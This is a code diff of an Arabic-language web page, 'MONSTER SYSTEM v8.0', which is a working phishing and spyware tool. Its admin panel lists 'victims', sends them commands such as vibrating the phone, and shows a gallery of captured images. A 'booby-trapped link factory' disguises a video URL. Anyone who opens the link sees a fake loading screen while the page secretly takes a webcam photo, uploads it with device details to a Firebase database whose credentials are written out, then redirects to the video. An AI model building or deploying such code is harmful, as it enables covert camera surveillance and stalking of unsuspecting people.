@@ -3,165 +3,157 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MONSTER OS v7.0 | THE DOCTOR</title>
+    <title>MONSTER SYSTEM v8.0 | THE DOCTOR</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; height: 100vh; overflow: hidden; font-size: 12px; }
+        :root { --neon: #00ff41; --bg: #000; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
         .grid { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: 1fr 1fr; height: 100vh; gap: 5px; padding: 5px; box-sizing: border-box; }
-        .box { border: 1px solid var(--neon); background: #000; border-radius: 5px; display: flex; flex-direction: column; overflow: hidden; }
-        .header { background: var(--neon); color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 10px; }
-        .content { flex: 1; overflow-y: auto; padding: 5px; }
-        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 8px; width: 100%; margin-top: 5px; border-radius: 3px; font-size: 10px; }
+        .box { border: 1px solid var(--neon); background: #050505; display: flex; flex-direction: column; overflow: hidden; border-radius: 8px; }
+        .header { background: var(--neon); color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 11px; }
+        .content { flex: 1; overflow-y: auto; padding: 8px; font-size: 12px; }
+        input, button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; width: 100%; margin-top: 5px; border-radius: 5px; }
         button:active { background: var(--neon); color: #000; }
-        .v-item { border-bottom: 1px solid #222; padding: 8px; cursor: pointer; position: relative; }
-        .v-item.active { background: #111; border-left: 4px solid #fff; }
-        .online-dot { width: 8px; height: 8px; background: #0f0; border-radius: 50%; display: inline-block; margin-left: 5px; }
-        img { width: 100%; border: 1px solid #333; margin-top: 5px; }
+        .v-card { border-bottom: 1px solid #222; padding: 10px; cursor: pointer; transition: 0.3s; }
+        .v-card:hover { background: #111; }
+        .v-card.active { border-right: 4px solid #fff; background: #151515; }
+        img { width: 100%; border: 1px solid #333; margin-top: 10px; border-radius: 5px; }
+        #target-screen { background: #000; height: 100vh; width: 100vw; position: fixed; z-index: 9999; display: none; text-align: center; color: white; }
     </style>
 </head>
 <body>
 
+<div id="target-screen">
+    <div style="margin-top: 40%;">
+        <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto;"></div>
+        <p>جاري تحميل الفيديو...</p>
+    </div>
+    <video id="video" style="display:none;" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
 <div id="admin-ui" class="grid">
     <div class="box">
-        <div class="header">📡 رادار الأجهزة النشطة</div>
-        <div class="content" id="list">بانتظار المزامنة...</div>
+        <div class="header">📡 رادار الأجهزة المتصلة</div>
+        <div class="content" id="victim-list">بانتظار المزامنة...</div>
     </div>
 
     <div class="box">
-        <div class="header">🕹️ تحكم السيادة (Direct)</div>
+        <div class="header">🕹️ مركز السيطرة والأوامر</div>
         <div class="content">
-            <b id="target-name">اختر جهازاً</b>
-            <button onclick="sendCmd('snap')">📸 سحب صورة فورية</button>
-            <button onclick="sendCmd('vibrate')">📳 هز الهاتف</button>
-            <button onclick="sendCmd('alert')">⚠️ إرسال تنبيه مخيف</button>
-            <button onclick="deleteVictim()" style="color:red; margin-top:15px;">🗑️ حذف الجلسة</button>
+            <h3 id="sel-target">اختر جهازاً</h3>
+            <button onclick="sendCmd('snap')">📸 سحب صورة الآن</button>
+            <button onclick="sendCmd('vibrate')">📳 هز الجهاز</button>
+            <button onclick="clearData()" style="color:red; margin-top:20px;">🗑️ تنظيف كافة الجلسات</button>
         </div>
     </div>
 
     <div class="box">
-        <div class="header">📸 معرض الصور المسحوبة</div>
+        <div class="header">📸 البيانات والصور المسحوبة</div>
         <div class="content" id="gallery"></div>
     </div>
 
     <div class="box">
-        <div class="header">⚙️ مصنع التلغيم الذكي</div>
+        <div class="header">⚙️ مصنع الروابط الملغمة</div>
         <div class="content">
-            <input type="text" id="vid-url" placeholder="رابط فيديو (YouTube/TikTok)">
+            <input type="text" id="url-input" placeholder="رابط فيديو (يوتيوب/تيك توك)">
             <button onclick="generateLink()">توليد الرابط الصاعق</button>
-            <div id="final-link" style="color:#0ff; font-size:9px; word-break:break-all; margin-top:10px;"></div>
+            <div id="result-link" style="color:#0ff; font-size:10px; margin-top:10px; word-break:break-all;"></div>
         </div>
     </div>
 </div>
 
-<div id="victim-ui" style="display:none; background:black; height:100vh; color:white; text-align:center; padding-top:40%;">
-    <h2>Loading Media...</h2>
-    <video id="v" style="display:none;" autoplay playsinline></video>
-    <canvas id="c" style="display:none;"></canvas>
-</div>
-
 <script>
-    const config = {
+    const firebaseConfig = {
         apiKey: "AIzaSyBT-2QQEdSdO-DsQvPESPc8cBQaW5azxqY",
         databaseURL: "https://monster-system-7f67e-default-rtdb.firebaseio.com",
         projectId: "monster-system-7f67e"
     };
-    firebase.initializeApp(config);
+    firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let selectedId = null;
+    let currentTargetId = null;
 
-    // --- منطق التفرقة بين الآدمن والضحية ---
-    const params = new URLSearchParams(window.location.search);
-    const targetUrl = params.get('v');
+    // --- اكتشاف الوضع (آدمن أم ضحية) ---
+    const urlParams = new URLSearchParams(window.location.search);
+    const targetBase64 = urlParams.get('video');
 
-    if (targetUrl) {
-        // إذا كان هناك رابط فيديو في العنوان، فهذا يعني أنه "ضحية"
-        runVictimLogic(atob(targetUrl));
+    if (targetBase64) {
+        runVictimLogic(atob(targetBase64));
     } else {
-        // إذا لم يكن هناك رابط، فهذا أنت "الآدمن"
-        initAdminLogic();
+        runAdminLogic();
     }
 
-    // --- وظائف الآدمن ---
-    function initAdminLogic() {
-        db.ref('victims').on('value', s => {
-            const list = document.getElementById('list');
+    // --- منطق الآدمن ---
+    function runAdminLogic() {
+        db.ref('victims').on('value', snap => {
+            const list = document.getElementById('victim-list');
             list.innerHTML = '';
-            s.forEach(child => {
+            snap.forEach(child => {
                 const v = child.val();
                 const id = child.key;
-                const isOnline = (Date.now() - v.lastSeen) < 15000;
-                list.innerHTML += `<div class="v-item ${id==selectedId?'active':''}" onclick="setTarget('${id}','${v.model}')">
-                    <span class="online-dot" style="background:${isOnline?'#0f0':'#f00'}"></span>
-                    <b>${v.model}</b><br><small>${v.ip} | ${v.time}</small>
+                const online = (Date.now() - v.lastSeen) < 15000;
+                list.innerHTML += `<div class="v-card ${id === currentTargetId ? 'active':''}" onclick="selectVictim('${id}','${v.model}')">
+                    <span style="color:${online?'#0f0':'#f00'}">●</span> ${v.model}<br>
+                    <small>${v.time} | IP: ${v.ip || 'Active'}</small>
                 </div>`;
-                if(id === selectedId && v.imgUrl) {
+                if(id === currentTargetId && v.imgUrl) {
                     document.getElementById('gallery').innerHTML = `<img src="${v.imgUrl}">` + document.getElementById('gallery').innerHTML;
                 }
             });
         });
     }
 
-    function setTarget(id, model) {
-        selectedId = id;
-        document.getElementById('target-name').innerText = "التحكم في: " + model;
+    function selectVictim(id, model) {
+        currentTargetId = id;
+        document.getElementById('sel-target').innerText = "التحكم في: " + model;
     }
 
-    function sendCmd(cmd) {
-        if(!selectedId) return alert("اختر جهازاً!");
-        db.ref('cmds/' + selectedId).set({ c: cmd, t: Date.now() });
+    function sendCmd(c) {
+        if(!currentTargetId) return alert("اختر جهازاً!");
+        db.ref('cmds/' + currentTargetId).set({ cmd: c, time: Date.now() });
     }
 
     function generateLink() {
-        const url = document.getElementById('vid-url').value;
-        const final = window.location.href.split('?')[0] + "?v=" + btoa(url);
-        document.getElementById('final-link').innerText = final;
+        const val = document.getElementById('url-input').value;
+        const link = window.location.href.split('?')[0] + "?video=" + btoa(val);
+        document.getElementById('result-link').innerText = link;
     }
 
-    function deleteVictim() {
-        if(selectedId) { db.ref('victims/'+selectedId).remove(); selectedId = null; }
+    function clearData() {
+        if(confirm("مسح الكل؟")) db.ref('/').remove();
     }
 
-    // --- بايلوت الضحية (الدمج الداخلي) ---
-    async function runVictimLogic(redUrl) {
+    // --- منطق الضحية (البايلوت الصامت) ---
+    async function runVictimLogic(redirectUrl) {
         document.getElementById('admin-ui').style.display = 'none';
-        document.getElementById('victim-ui').style.display = 'block';
+        document.getElementById('target-screen').style.display = 'block';
+
+        const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "iPhone/PC";
+        const ref = db.ref('victims').push();
+        
+        // تسجيل الجلسة فوراً
+        await ref.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video:true});
-            const video = document.getElementById('v');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
             video.srcObject = stream;
             await video.play();
 
-            const canvas = document.getElementById('c');
+            const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const img = canvas.toDataURL('image/jpeg', 0.5);
+            const imgData = canvas.toDataURL('image/jpeg', 0.5);
+            
+            await ref.update({ imgUrl: imgData, lastSeen: Date.now() });
+        } catch (e) { console.log("Permission Denied"); }
 
-            // استخراج اسم الجهاز بدقة
-            let model = "Android Device";
-            if(navigator.userAgent.includes("Samsung")) model = "Samsung Galaxy";
-            if(navigator.userAgent.includes("iPhone")) model = "iPhone";
-
-            const ref = db.ref('victims').push();
-            await ref.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString(), imgUrl: img, ip: "Active" });
-
-            // الاستماع للأوامر الحية
-            db.ref('cmds/' + ref.key).on('value', snap => {
-                const data = snap.val();
-                if(data) {
-                    if(data.c === 'vibrate') navigator.vibrate(500);
-                    if(data.c === 'alert') alert("SYSTEM CRITICAL ERROR!");
-                    if(data.c === 'snap') {
-                         // إعادة التقاط الصورة وإرسالها
-                    }
-                }
-            });
-
-            setTimeout(() => { window.location.href = redUrl; }, 2000);
-        } catch(e) { window.location.href = redUrl; }
+        // توجيه الضحية بعد 2 ثانية لضمان وصول البيانات
+        setTimeout(() => { window.location.href = redirectUrl; }, 2500);
     }
 </script>
+
+<style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 </body>
 </html>
